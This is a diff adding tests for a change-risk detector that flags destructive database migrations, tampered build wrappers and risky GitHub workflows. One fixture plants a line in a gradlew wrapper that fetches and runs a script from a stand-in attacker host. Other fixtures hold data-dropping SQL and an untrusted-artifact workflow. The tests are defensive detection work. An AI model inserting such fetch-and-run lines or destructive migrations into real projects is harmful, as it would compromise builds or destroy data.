@@ -46,6 +46,7 @@ from consequence_engine import (
     DETECTOR_D06_GUARD,
     DETECTOR_D08_WORKFLOW,
     DETECTOR_D09_TEST,
+    DETECTOR_D10_MIGRATION,
     POLICY_BLOCK,
     POLICY_PASS,
     POLICY_REVIEW,
@@ -1586,3 +1587,231 @@ class TestDetectorAccuracyV2AndUsability:
 
 
 
+
+
+# ==============================================================================
+# 7. D10: DATABASE MIGRATION & PERSISTENCE LOSS + D05/D08 EXTENDED INTEGRITY
+# ==============================================================================
+
+class TestDetectorD10AndExtendedIntegrity:
+    def test_d10_sql_destructive_table_and_column_drop_and_truncate(self):
+        """
+        Verify D10 detects:
+        1) SQL DROP TABLE and DROP COLUMN in migration files -> DESTRUCTIVE_PERSISTENCE_MIGRATION (REVIEW).
+        2) SQL TRUNCATE TABLE in migration files -> CATASTROPHIC_DATA_WIPEOUT (BLOCK).
+        """
+        engine = ConsequenceEngine(mode="enforce")
+
+        # 1. SQL DROP TABLE & DROP COLUMN -> REVIEW / HIGH
+        drop_sql = (
+            "-- Migration: remove legacy customer profile fields\n"
+            "ALTER TABLE users DROP COLUMN phone_number;\n"
+            "DROP TABLE customer_profiles;\n"
+        )
+        rep_drop = engine.analyze_deltas([
+            FileDeltaInput("db/migrations/20261024_drop_profiles.sql", change_type="A", base_source="", head_source=drop_sql)
+        ])
+        assert rep_drop.recommended_verdict == "REVIEW"
+        d10_findings = [f for f in rep_drop.findings if f.detector_id == DETECTOR_D10_MIGRATION]
+        assert len(d10_findings) == 1
+        assert d10_findings[0].consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"
+        assert d10_findings[0].policy_recommendation == POLICY_REVIEW
+        assert "customer_profiles" in d10_findings[0].affected_symbols
+        assert "phone_number" in d10_findings[0].affected_symbols
+
+        # 2. SQL TRUNCATE TABLE -> BLOCK / CRITICAL
+        trunc_sql = (
+            "-- Dangerous maintenance cleanup\n"
+            "TRUNCATE TABLE audit_event_logs;\n"
+        )
+        rep_trunc = engine.analyze_deltas([
+            FileDeltaInput("migrations/0004_truncate_logs.sql", change_type="A", base_source="", head_source=trunc_sql)
+        ])
+        assert rep_trunc.recommended_verdict == "DESTRUCTIVE"
+        trunc_findings = [f for f in rep_trunc.findings if f.consequence_class == "CATASTROPHIC_DATA_WIPEOUT"]
+        assert len(trunc_findings) == 1
+        assert trunc_findings[0].policy_recommendation == POLICY_BLOCK
+
+    def test_d10_alembic_irreversible_drop_without_downgrade(self):
+        """
+        Verify Alembic migrations:
+        1) op.drop_table with empty downgrade() -> IRREVERSIBLE_PERSISTENCE_DROP (BLOCK).
+        2) op.drop_table with valid downgrade() -> DESTRUCTIVE_PERSISTENCE_MIGRATION (REVIEW).
+        """
+        engine = ConsequenceEngine(mode="enforce")
+
+        # 1. Irreversible Alembic migration (empty downgrade) -> BLOCK / CRITICAL
+        alembic_irreversible = (
+            "from alembic import op\n"
+            "import sqlalchemy as sa\n\n"
+            "def upgrade():\n"
+            "    op.drop_table('auth_sessions')\n\n"
+            "def downgrade():\n"
+            "    pass\n"
+        )
+        rep_irrev = engine.analyze_deltas([
+            FileDeltaInput("alembic/versions/20261024_drop_sessions.py", change_type="A", base_source="", head_source=alembic_irreversible)
+        ])
+        assert rep_irrev.recommended_verdict == "DESTRUCTIVE"
+        d10_irrev = [f for f in rep_irrev.findings if f.consequence_class == "IRREVERSIBLE_PERSISTENCE_DROP"]
+        assert len(d10_irrev) == 1
+        assert d10_irrev[0].policy_recommendation == POLICY_BLOCK
+        assert "auth_sessions" in d10_irrev[0].affected_symbols
+
+        # 2. Reversible Alembic migration -> REVIEW / HIGH
+        alembic_reversible = (
+            "from alembic import op\n"
+            "import sqlalchemy as sa\n\n"
+            "def upgrade():\n"
+            "    op.drop_table('auth_sessions')\n\n"
+            "def downgrade():\n"
+            "    op.create_table('auth_sessions', sa.Column('id', sa.Integer, primary_key=True))\n"
+        )
+        rep_rev = engine.analyze_deltas([
+            FileDeltaInput("alembic/versions/20261024_drop_sessions.py", change_type="A", base_source="", head_source=alembic_reversible)
+        ])
+        assert rep_rev.recommended_verdict == "REVIEW"
+        d10_rev = [f for f in rep_rev.findings if f.consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"]
+        assert len(d10_rev) == 1
+        assert d10_rev[0].policy_recommendation == POLICY_REVIEW
+
+    def test_d10_django_and_knex_destructive_migrations(self):
+        """Verify Django DeleteModel/RemoveField and Knex dropColumn detection."""
+        engine = ConsequenceEngine(mode="enforce")
+
+        # 1. Django migration
+        django_mig = (
+            "from django.db import migrations, models\n\n"
+            "class Migration(migrations.Migration):\n"
+            "    operations = [\n"
+            "        migrations.DeleteModel(name='OldAccount'),\n"
+            "        migrations.RemoveField(model_name='UserProfile', name='ssn'),\n"
+            "    ]\n"
+        )
+        rep_dj = engine.analyze_deltas([
+            FileDeltaInput("myapp/migrations/0005_remove_old.py", change_type="A", base_source="", head_source=django_mig)
+        ])
+        assert rep_dj.recommended_verdict == "REVIEW"
+        d10_dj = [f for f in rep_dj.findings if f.detector_id == DETECTOR_D10_MIGRATION]
+        assert len(d10_dj) == 1
+        assert "OldAccount" in d10_dj[0].affected_symbols
+        assert "UserProfile.ssn" in d10_dj[0].affected_symbols
+
+        # 2. Knex JS migration
+        knex_mig = (
+            "exports.up = function(knex) {\n"
+            "  return knex.schema.table('users', function(t) {\n"
+            "    t.dropColumn('secret_token');\n"
+            "  });\n"
+            "};\n"
+        )
+        rep_knex = engine.analyze_deltas([
+            FileDeltaInput("db/migrations/20261024_drop_token.js", change_type="A", base_source="", head_source=knex_mig)
+        ])
+        assert rep_knex.recommended_verdict == "REVIEW"
+        d10_knex = [f for f in rep_knex.findings if f.detector_id == DETECTOR_D10_MIGRATION]
+        assert len(d10_knex) == 1
+        assert "secret_token" in d10_knex[0].affected_symbols
+
+    def test_d10_safe_additive_migration_and_temp_table_drops(self):
+        """
+        Verify False Positive controls:
+        - Additive migration (CREATE TABLE, ADD COLUMN) -> SAFE (0 findings).
+        - Dropping temporary/staging table (temp_import, staging_users) -> SAFE (0 findings).
+        - Test fixture files are ignored -> SAFE.
+        """
+        engine = ConsequenceEngine(mode="enforce")
+
+        safe_sql = (
+            "CREATE TABLE feature_flags (id SERIAL PRIMARY KEY, name VARCHAR(50));\n"
+            "ALTER TABLE users ADD COLUMN is_verified BOOLEAN DEFAULT FALSE;\n"
+            "-- Safe drop of temporary ETL staging tables\n"
+            "DROP TABLE temp_import_data;\n"
+            "DROP TABLE staging_orders;\n"
+        )
+        rep_safe = engine.analyze_deltas([
+            FileDeltaInput("migrations/20261024_add_feature_flags.sql", change_type="A", base_source="", head_source=safe_sql)
+        ])
+        assert rep_safe.recommended_verdict == "SAFE"
+        assert [f for f in rep_safe.findings if f.detector_id == DETECTOR_D10_MIGRATION] == []
+
+        # Test files should never be treated as production migrations
+        test_sql = "DROP TABLE test_users;\n"
+        rep_test = engine.analyze_deltas([
+            FileDeltaInput("tests/fixtures/cleanup.sql", change_type="A", base_source="", head_source=test_sql)
+        ])
+        assert [f for f in rep_test.findings if f.detector_id == DETECTOR_D10_MIGRATION] == []
+
+    def test_d05_build_wrapper_script_tampering(self):
+        """Verify D05 detects suspicious remote script execution inside build wrappers (mvnw, gradlew, Makefile)."""
+        engine = ConsequenceEngine(mode="enforce")
+
+        # 1. Malicious gradlew containing curl | bash -> BLOCK / CRITICAL
+        evil_gradlew = (
+            "#!/bin/sh\n"
+            "# Wrapper script for Gradle\n"
+            "curl -fsSL https://evil-c2.attacker.com/payload.sh | sh\n"
+            "exec gradle \"$@\"\n"
+        )
+        rep_evil = engine.analyze_deltas([
+            FileDeltaInput("gradlew", change_type="M", base_source="#!/bin/sh\nexec gradle \"$@\"\n", head_source=evil_gradlew)
+        ])
+        assert rep_evil.recommended_verdict == "DESTRUCTIVE"
+        d05_wrapper = [f for f in rep_evil.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"]
+        assert len(d05_wrapper) == 1
+        assert d05_wrapper[0].policy_recommendation == POLICY_BLOCK
+
+        # 2. Benign gradlew update -> SAFE
+        clean_gradlew = (
+            "#!/bin/sh\n"
+            "# Updated Gradle wrapper version\n"
+            "exec gradle --daemon \"$@\"\n"
+        )
+        rep_clean = engine.analyze_deltas([
+            FileDeltaInput("gradlew", change_type="M", base_source="#!/bin/sh\nexec gradle \"$@\"\n", head_source=clean_gradlew)
+        ])
+        assert rep_clean.recommended_verdict == "SAFE"
+        assert [f for f in rep_clean.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"] == []
+
+    def test_d08_unpinned_action_addition_and_workflow_run_artifact(self):
+        """Verify D08 detects unpinned third-party actions and privileged workflow_run artifact downloads."""
+        engine = ConsequenceEngine(mode="enforce")
+
+        # 1. Newly introduced unpinned third-party action -> WARN / MEDIUM
+        unpinned_wf = (
+            "name: Deploy\n"
+            "on: [push]\n"
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: third-party-vendor/unknown-linter@v3\n"
+            "      - run: echo \"Done\"\n"
+        )
+        rep_unpinned = engine.analyze_deltas([
+            FileDeltaInput(".github/workflows/deploy.yml", change_type="A", base_source="", head_source=unpinned_wf)
+        ])
+        d08_unpinned = [f for f in rep_unpinned.findings if f.consequence_class == "ACTION_PIN_UNPINNED"]
+        assert len(d08_unpinned) == 1
+        assert "third-party-vendor/unknown-linter" in d08_unpinned[0].affected_symbols
+
+        # 2. Privileged workflow_run downloading untrusted artifact -> REVIEW / HIGH
+        wfr_artifact_wf = (
+            "name: Process PR Artifact\n"
+            "on:\n"
+            "  workflow_run:\n"
+            "    workflows: [\"Untrusted External PR\"]\n"
+            "    types: [completed]\n"
+            "jobs:\n"
+            "  process:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/download-artifact@v4\n"
+            "      - run: unzip artifact.zip && ./run_tests.sh\n"
+        )
+        rep_wfr = engine.analyze_deltas([
+            FileDeltaInput(".github/workflows/process_artifact.yml", change_type="A", base_source="", head_source=wfr_artifact_wf)
+        ])
+        d08_wfr = [f for f in rep_wfr.findings if f.consequence_class == "WORKFLOW_RUN_UNTRUSTED_ARTIFACT"]
+        assert len(d08_wfr) == 1
+        assert d08_wfr[0].policy_recommendation == POLICY_REVIEW
